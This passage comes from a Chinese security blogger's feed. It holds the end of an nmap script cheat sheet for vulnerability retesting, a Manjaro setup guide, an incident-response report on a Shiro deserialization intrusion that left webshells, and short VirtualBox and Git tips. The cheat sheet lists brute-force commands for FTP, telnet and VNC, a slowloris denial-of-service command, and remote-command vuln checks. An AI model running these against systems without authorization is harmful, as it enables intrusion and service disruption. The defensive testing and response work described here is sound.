ipaddress</span><br></pre></td></tr></table></figure></p><p>rsync未授权漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 873 --script rsync=brute ==script=args &apos;rsync-brute.module=www&apos;</span><br></pre></td></tr></table></figure></p><p>http拒绝服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --max-paralleism 800-script http=slowloris siteaddress</span><br></pre></td></tr></table></figure></p><p>ftp弱口令暴力破解<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script ftp-brute --script-args brute.emptypass=true,ftp-brute.timeout=30,userdb=/root/dirtionary/usernames.txt,brute.useraspass=true,passdb=/root/dirtionary/passwords.txt,brute.threads=3,brute.delay=6 ipaddress</span><br></pre></td></tr></table></figure></p><p>检测CVE-2011-2523中的ftp-vsftpd-backdoor<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T2 --script ftp-vsftpd-backdoor ipaddress</span><br></pre></td></tr></table></figure></p><p>验证http中开启的-methods 方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T3 --script http-methods --script-args http.test-all=true,http.url-path=/siteaddress</span><br></pre></td></tr></table></figure></p><p>验证HTTP.sys 远程代码执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script http-vuln-cve2015-1635 ipaddress</span><br></pre></td></tr></table></figure></p><p>验证 SSL POODLE information leak<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 443 --version-light --script ssl-poodle ipaddress</span><br></pre></td></tr></table></figure></p><p>验证http 中开启了put 方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script http-put --script-args http-put.url=/uploads/testput.txt,http-put.file=/root/put.txt ipaddress</span><br></pre></td></tr></table></figure></p><p>验证mysql 匿名访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script mysql-empty-password ipaddress</span><br></pre></td></tr></table></figure></p><p>验证cve2015-1427 漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script http-vuln-cve2015-1427 --script-args command=ls ipaddress</span><br></pre></td></tr></table></figure></p><p>验证cve2014-8877漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn --script http-vuln-cve2014-8877 --script-args http-vuln-cve2014-8877.cmd=dir,http-vuln-cve2014-8877.uri=/wordpress ipaddress</span><br></pre></td></tr></table></figure></p><p>验证Cisco ASA中的CVE-2014-2126,CVE-2014-2127,CVE-2014-21,CVE-2014-2129漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 443 --script http-vuln-cve2014-2126,http-vuln-cve2014-2127,http-vuln-cve2014-2128,http-vuln-cve2014-2129 ipaddress</span><br></pre></td></tr></table></figure></p><p>验证低安全的 SSHv1，sslv2协议<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script sshv1,sslv2 siteadress</span><br></pre></td></tr></table></figure></p><p>验证CVE-2014-0224 ssl-ccs-injection<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn --script ssl-ccs-injection ipaddress</span><br></pre></td></tr></table></figure></p><p>验证ssl-cert证书问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -v --script ssl-cert ipaddress</span><br></pre></td></tr></table></figure></p><p>验证SSL证书的有限期<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn --script ssl-date siteadress</span><br></pre></td></tr></table></figure></p><p>验证 Debian OpenSSL keys<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 443 --script ssl-known-key ipaddress</span><br></pre></td></tr></table></figure></p><p>验证弱加密SSL套件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script ssl-enum-ciphers ipaddress</span><br></pre></td></tr></table></figure></p><p>验证CVE 2015-4000<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script ssl-dh-params siteadress</span><br></pre></td></tr></table></figure></p><p>验证多种SSL漏洞问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 203.195.139.153 --vv --script sshv1,ssl-ccs-injection,ssl-cert,ssl-date,ssl-dh-params,ssl-enum-ciphers,ssl-google-cert-catalog,ssl-heartbleed,ssl-known-key,sslv2</span><br></pre></td></tr></table></figure></p><p>在网络中检测某主机是否存在窃听他人流量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script sniffer-detect ipaddress</span><br></pre></td></tr></table></figure></p><p>暴力破解telnet<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst --script-args telnet-brute.timeout=8s ipaddress</span><br></pre></td></tr></table></figure></p><p>验证telnet是否支持加密<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script telnet-encryption ipaddress</span><br></pre></td></tr></table></figure></p><p>精准地确认端口上运行的服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script unusual-port ipaddress</span><br></pre></td></tr></table></figure></p><p>收集VNC信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script vnc-info ipaddress</span><br></pre></td></tr></table></figure></p><p>暴力破解VNC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script vnc-brute --script-args brute.guesses=6,brute.emptypass=true,userdb=/root/dictionary/user.txt,brute.useraspass=true,passdb=/root/dictionary/pass.txt,brute.retries=3,brute.threads=2,brute.delay=3 ipaddress</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      前两天在做等保中的漏洞复测，用的nmap脚本比较多，今天刚好闲下来，把nmap脚本用法简单写一下
    
    </summary>
    
    
      <category term="nmap" scheme="https://hexchristmas.github.io/tags/nmap/"/>
    
  </entry>
  
  <entry>
    <title>Manjaro i3配置命令及相关优化</title>
    <link href="https://hexchristmas.github.io/2019/09/15/Manjaro-i3%E9%85%8D%E7%BD%AE%E5%91%BD%E4%BB%A4%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BC%98%E5%8C%96/"/>
    <id>https://hexchristmas.github.io/2019/09/15/Manjaro-i3配置命令及相关优化/</id>
    <published>2019-09-15T14:39:16.000Z</published>
    <updated>2020-04-09T11:10:57.497Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Manjaro-i3配置命令及相关优化"><a href="#Manjaro-i3配置命令及相关优化" class="headerlink" title="Manjaro i3配置命令及相关优化"></a>Manjaro i3配置命令及相关优化</h1><h2 id="进入不了安装盘，安装完登录输入完密码黑屏，输入neofetch突然卡住，进入manjaro-manager-settings卡住"><a href="#进入不了安装盘，安装完登录输入完密码黑屏，输入neofetch突然卡住，进入manjaro-manager-settings卡住" class="headerlink" title="进入不了安装盘，安装完登录输入完密码黑屏，输入neofetch突然卡住，进入manjaro manager settings卡住"></a>进入不了安装盘，安装完登录输入完密码黑屏，输入neofetch突然卡住，进入manjaro manager settings卡住</h2><p>对于进入不了安装盘，先进系统，引导界面，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">按e，把driver=free改成driver=intel，</span><br></pre></td></tr></table></figure></p><p>在driver=intel追加一下内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xdriver=mesa acpi_osi=! acpi_osi=&quot;Windows 2009&quot;</span><br></pre></td></tr></table></figure></p><p>对于安装完登录输入完密码黑屏，输入neofetch突然卡住，进入manjaro manager settings卡住，使用vim或者vi或者nano对/etc/default/grub找到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=&quot;splash quiet &quot;</span><br></pre></td></tr></table></figure></p><p>在后边追加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xdriver=mesa acpi_osi=! acpi_osi=&quot;Windows 2009&quot;</span><br></pre></td></tr></table></figure></p><p>保存退出，为什么追加这个？告诉硬件，我是windows你别在闹屁了<br>在你这样安装完，你的无线和蓝牙可能用不了，这时候你需要插网线或者勇手机开热点，配置更新源更新再去Manjaro Setting manager安装无线网卡</p><h2 id="配置pacman源"><a href="#配置pacman源" class="headerlink" title="配置pacman源"></a>配置pacman源</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman-mirrors -i -c China -m rank</span><br></pre></td></tr></table></figure><p>不知道什么规则，我直接全选了</p><h2 id="配置archlinuxcn"><a href="#配置archlinuxcn" class="headerlink" title="配置archlinuxcn"></a>配置archlinuxcn</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/pacman.conf</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[archlinuxcn]</span><br><span class="line"></span><br><span class="line">SigLevel = Optional TrustedOnly</span><br><span class="line"></span><br><span class="line">Server = http://repo.archlinuxcn.org/$arch</span><br></pre></td></tr></table></figure><p>选择最快的源列表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman-mirrors -g</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -Syyu</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S archlinuxcn-keyring</span><br></pre></td></tr></table></figure><h2 id="安装yaourt"><a href="#安装yaourt" class="headerlink" title="安装yaourt"></a>安装yaourt</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S yaourt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">## 安装搜狗输入法</span><br></pre></td></tr></table></figure><p>sudo pacman -S fcitx-sogoupinyin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">sudo pacman -S fcitx-im</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S fcitx-configtool</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano ~/.profile</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export GTK_IM_MODULE=fcitx</span><br><span class="line">export QT_IM_MODULE=fcitx</span><br><span class="line">export XMODIFIERS=&quot;@im=fcitx&quot;</span><br></pre></td></tr></table></figure><h2 id="安装V2ray"><a href="#安装V2ray" class="headerlink" title="安装V2ray"></a>安装V2ray</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S v2ray</span><br></pre></td></tr></table></figure><p>如果你在安装archlinuxcn遇到问题，以下命令可帮你解决问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -rf /etc/pacman.d/gnupg</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman-key --init</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman-key --populate archlinux</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman-key --refresh-keys</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -Sc</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -Syu</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S archlinuxcn-keyring</span><br></pre></td></tr></table></figure><h2 id="字体安装"><a href="#字体安装" class="headerlink" title="字体安装"></a>字体安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo pacman -S ttf-dejavu adobe-source-han-sans-otc-fonts adobe-source-code-pro-fonts wqy-bitmapfont wqy-microhei wqy-zenhei wqy-microhei-lite</span><br></pre></td></tr></table></figure><h2 id="安装chrome"><a href="#安装chrome" class="headerlink" title="安装chrome"></a>安装chrome</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S google-chrome</span><br></pre></td></tr></table></figure><h2 id="安装Firefox"><a href="#安装Firefox" class="headerlink" title="安装Firefox"></a>安装Firefox</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S firefox firefox-i18n-zh-cn</span><br></pre></td></tr></table></figure><h2 id="安装pycharm-社区版"><a href="#安装pycharm-社区版" class="headerlink" title="安装pycharm 社区版"></a>安装pycharm 社区版</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S pycharm</span><br></pre></td></tr></table></figure><p>安装zsh<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S zsh</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chsh -s /bin/zsh #默认启动zsh</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">## 安装完你发现conky貌似有口口口这样的缺少字体</span><br></pre></td></tr></table></figure><p>/usr/share/conky/conky_maia    #桌面右侧的状态栏<br>/usr/share/conky/conky1.10_shortcuts_maia    #桌面左侧的快捷键显示栏<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">修改conky_maia支持中文</span><br></pre></td></tr></table></figure></p><p>font = ‘WenQuanYi Micro Hei:size=8’,<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">或者</span><br></pre></td></tr></table></figure></p><p>font = ‘WenQuanYi Zen Hei:size=8’,<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">## 安装powerline</span><br></pre></td></tr></table></figure></p><p>pacman -S ttf-dejavu-sans-mono-powerline python-powerline  powerline  powerline-common<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">pacman -S python-pip git</span><br></pre></td></tr></table></figure></p><p>pip show powerline-status<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">编辑~/.bashrc文件，在文件末尾加上</span><br></pre></td></tr></table></figure></p><p>powerline-daemon -q<br>POWERLINE_BASH_CONTINUATION=1<br>POWERLINE_BASH_SELECT=1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">. /usr/lib/python3.6/site-packages/powerline/bindings/bash/powerline.sh #注意. 和 /usr之间有个空格。</span><br></pre></td></tr></table></figure></p><p>编辑~/.vimrc文件，将一下内容添加到文件中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set rtp+=/usr/lib/python3.6/site-packages/powerline/bindings/vim/</span><br><span class="line">set laststatus=2</span><br><span class="line">set t_Co=256</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      之前都是黑苹果单系统，后来一次的awd上发现虽然苹果是unix但是linux很多库mac没有，本想黑苹果+ParrotSecrityOS，但无奈鸟总是卡在grub上，只能换成黑苹果+Manjaro双系统，这里把折腾Manjaro i3的心得写一下
    
    </summary>
    
    
      <category term="Archlinux" scheme="https://hexchristmas.github.io/tags/Archlinux/"/>
    
      <category term="Manjaro" scheme="https://hexchristmas.github.io/tags/Manjaro/"/>
    
  </entry>
  
  <entry>
    <title>某项目应急响应处置</title>
    <link href="https://hexchristmas.github.io/2019/08/23/%E6%9F%90%E9%A1%B9%E7%9B%AE%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%A4%84%E7%BD%AE/"/>
    <id>https://hexchristmas.github.io/2019/08/23/某项目应急响应处置/</id>
    <published>2019-08-23T15:07:42.000Z</published>
    <updated>2020-04-09T11:10:57.501Z</updated>
    
    <content type="html"><![CDATA[<h1 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h1><p><a href="https://github.com/HexChristmas/IncidentResponseKnowledge" target="_blank" rel="noopener">https://github.com/HexChristmas/IncidentResponseKnowledge</a></p><h1 id="安全事件概述"><a href="#安全事件概述" class="headerlink" title="安全事件概述"></a>安全事件概述</h1><p>某天晚20:00接到客户应急响应请求，现场流量设备发现服务器webshell报警，需要进行排查以及溯源，其实是接着上次那个shiro利用写的，这次写一下应急的过程</p><h1 id="定位事件根源"><a href="#定位事件根源" class="headerlink" title="定位事件根源"></a>定位事件根源</h1><p>通过对告警日志及webshell，确定这次攻击是通过shiro反序列化获取服务器全县并反弹shell写入webshell</p><h1 id="应急响应流程"><a href="#应急响应流程" class="headerlink" title="应急响应流程"></a>应急响应流程</h1><h2 id="系统分析"><a href="#系统分析" class="headerlink" title="系统分析"></a>系统分析</h2><p>通过对失陷机器排查，发现在/vdb2/apps/apache-tomcat-7.0.82-8080/webapps/ilive/tysx/js/下发现后门：md5.jsp，创建时间为2019-08-08 15:41:25。在xxx的目录/vdb2/apps/apache-tomcat-7.0.82-8080/webapps/ilive/tysx下发现webhsell后门：.mm.jsp，创建时间为2019-08-08 23:51:17。通过分析服务器相关组件、访问日志、流量日志等线索，确定攻击者是通过shiro组件的反序列化漏洞，反弹shell之后，部署的两个webshell后门。</p><p>web服务器的history日志：</p><p><img src="https://raw.githubusercontent.com/HexChristmas/IncidentResponseKnowledge/master/source/1.png" alt="img1"></p><p><img src="https://raw.githubusercontent.com/HexChristmas/IncidentResponseKnowledge/master/source/2.png" alt="img2"></p><p>根据history可以看到，攻击者判断是否能出网，然后在反弹shell，部署webshell后门，操作时间段大约在：2019.08.08 15:14~2019.08.08 15:41。</p><p><img src="https://raw.githubusercontent.com/HexChristmas/IncidentResponseKnowledge/master/source/3.png" alt="img3"></p><p>除此之外，还看到.mm.jsp的创建时间为2019-08-08 23:51:17，而shiro的反序列化攻击时间为2019-08-08 23:44:41，操作时间段相符</p><p><img src="https://raw.githubusercontent.com/HexChristmas/IncidentResponseKnowledge/master/source/4.png" alt="img4"></p><p><img src="https://raw.githubusercontent.com/HexChristmas/IncidentResponseKnowledge/master/source/5.png" alt="img5"></p><p>经开发韵味确认，该服务器上部署的shiro框架版本为1.2.2，该版本存在反序列化漏洞</p><h2 id="安全事件处置"><a href="#安全事件处置" class="headerlink" title="安全事件处置"></a>安全事件处置</h2><ol><li><p>删除webshell后门</p></li><li><p>删除啊shiro组件或删除shiro到最新版本</p></li><li><p>安装杀毒软件</p></li><li><p>修改受感染的用户密码</p></li></ol><h1 id="应急响应总结"><a href="#应急响应总结" class="headerlink" title="应急响应总结"></a>应急响应总结</h1><p>本次应急响应，攻击者通过shiro组建的发序列化漏洞获取到主机权限，并在反弹shjell之后，留下后门，攻击者在拿到主机权限之后，不排除内网横向移动到可能</p>]]></content>
    
    <summary type="html">
    
      某天晚20:00接到客户应急响应请求，现场流量设备发现服务器webshell报警，需要进行排查以及溯源，其实是接着上次那个shiro利用写的，这次写一下应急的过程
    
    </summary>
    
    
      <category term="incident response" scheme="https://hexchristmas.github.io/tags/incident-response/"/>
    
  </entry>
  
  <entry>
    <title>装virtualbox出现WARNING: The vboxdrv kernel module is not loaded[sloved]</title>
    <link href="https://hexchristmas.github.io/2019/08/17/%E8%A3%85virtualbox%E5%87%BA%E7%8E%B0WARNING-The-vboxdrv-kernel-module-is-not-loaded-sloved/"/>
    <id>https://hexchristmas.github.io/2019/08/17/装virtualbox出现WARNING-The-vboxdrv-kernel-module-is-not-loaded-sloved/</id>
    <published>2019-08-17T12:14:39.000Z</published>
    <updated>2020-04-09T11:10:57.501Z</updated>
    
    <content type="html"><![CDATA[<p>今天在装virtualbox时候出现了这个错误<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WARNING: The vboxdrv kernel module is not loaded. Either there is no module</span><br><span class="line">         available for the current kernel (3.11.1-2-ARCH) or it failed to</span><br><span class="line">         load. Please reinstall the kernel module virtualbox-host-modules or</span><br><span class="line">         if you don&apos;t use our stock kernel compile the modules with</span><br></pre></td></tr></table></figure></p><p>以为是安装包问题，下载了vmware，发现也一样，解决方法如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -r //查看系统内核版本</span><br></pre></td></tr></table></figure></p><p>搜索所有可用模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-cache search virtualbox-host-modules</span><br></pre></td></tr></table></figure></p><p>我的内核是4.19，就直接安装了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install linux419-virtualbox-host-modules</span><br></pre></td></tr></table></figure></p><p>安装完之后，重启内核模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /sbin/rcvboxdrv</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Unloading modules:</span><br><span class="line">Loading modules: vboxnetadp vboxnetflt vboxpci vboxdrv</span><br></pre></td></tr></table></figure><p>在启动virtualbox就没问题了</p>]]></content>
    
    <summary type="html">
    
      WARNING The vboxdrv kernel module is not loaded. Either there is no module available for the current kernel (3.11.1-2-ARCH) or it failed to load. Please reinstall the kernel module virtualbox-host-modules or if you don&#39;t use our stock kernel compile the modules with
    
    </summary>
    
    
      <category term="debian" scheme="https://hexchristmas.github.io/tags/debian/"/>
    
      <category term="virtualbox" scheme="https://hexchristmas.github.io/tags/virtualbox/"/>
    
  </entry>
  
  <entry>
    <title>Git使用技巧</title>
    <link href="https://hexchristmas.github.io/2019/08/15/Git%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    <id>https://hexchristmas.github.io/2019/08/15/Git使用技巧/</id>
    <published>2019-08-15T14:19:09.000Z</published>
    <updated>2020-04-09T11:10:57.493Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Git使用技巧"><a href="#Git使用技巧" class="headerlink" title="Git使用技巧"></a>Git使用技巧</h1><h2 id="git如何上传大于100M文件"><a href="#git如何上传大于100M文件" class="headerlink" title="git如何上传大于100M文件"></a>git如何上传大于100M文件</h2><p><img src="/2019/08/15/Git使用技巧/a.png" alt="image|549x500"> </p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;# xxxxxxxxxxx &gt;&gt; README.md</span><br><span class="line">git init</span><br><span class="line">git add README.md</span><br><span class="line">git commit -m &quot;first commit&quot;</span><br><span class="line">git remote add origin https://github.com/xxxxx/xxxxxxx.git</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><p>这些基本操作就不用说了吧，下面进入关键步骤</p><hr><p>你想上传大于100MB你首先得装一个Git Large<br>鸟下就简单了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git-lfs</span><br></pre></td></tr></table></figure></p><p>Mac下怎么整？直接brew<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install git-lfs</span><br></pre></td></tr></table></figure></p><p>装完了，咋用？？？<br>cd到你仓库下，初始化 git lfs,很简单<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//track文件类型，注意这里是track文件类型，不是track你要上传到文件看好，加入你想上传一个233.mp4，那你就track &quot;*.mp4&quot;</span><br><span class="line">git track &quot;*.mp4&quot; //以上边为例track一个文件类型为mp4</span><br><span class="line">git add .gitattributes //提交 .gitattributes 信息</span><br></pre></td></tr></table></figure></p><p>假如你想上传到不都是mp4，怎么办？你还想上传其他格式比如(pdf docx ppt )，继续track 你想上传的文件类型，然后commit信息，再举个例子，我想同时上传一个大于100MB的pdf和mp4<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git track &quot;*.mp4&quot; </span><br><span class="line">git add .gitattributes</span><br><span class="line">git track &quot;*.pdf&quot; </span><br><span class="line">git add .gitattributes</span><br></pre></td></tr></table></figure></p><p>简单的不能在简单了吧，，，，<br>然后就是上传文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git add 233.mp4</span><br><span class="line">git lfs ls-files //这个关注一下，你执行完命令你得看看这个大于100M文件是不是在lfs控制下如果输入完显示空白你得在仔细检查一下是不是哪有错误</span><br><span class="line">git commit -m &quot;2333&quot;</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure></p><p>最后补充一下如果你不小心track错了咋整？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git lfs untrack &quot;*.mp4&quot; //你可以用untrack取消跟踪</span><br></pre></td></tr></table></figure></p><p>成功上传大概这个样子<br><img src="/2019/08/15/Git使用技巧/b.png" alt="image|648x439"> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Git使用技巧&quot;&gt;&lt;a href=&quot;#Git使用技巧&quot; class=&quot;headerlink&quot; title=&quot;Git使用技巧&quot;&gt;&lt;/a&gt;Git使用技巧&lt;/h1&gt;&lt;h2 id=&quot;git如何上传大于100M文件&quot;&gt;&lt;a href=&quot;#git如何上传大于100M文件&quot; c
      
    
    </summary>
    
    
      <category term="github" scheme="https://hexchristmas.github.io/tags/github/"/>
    
  </entry>
  
  <entry>
    <title>GoogleHack常用语法</title>
    <link href="https://hexchristmas.github.io/2019/07/21/GoogleHack%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/"/>
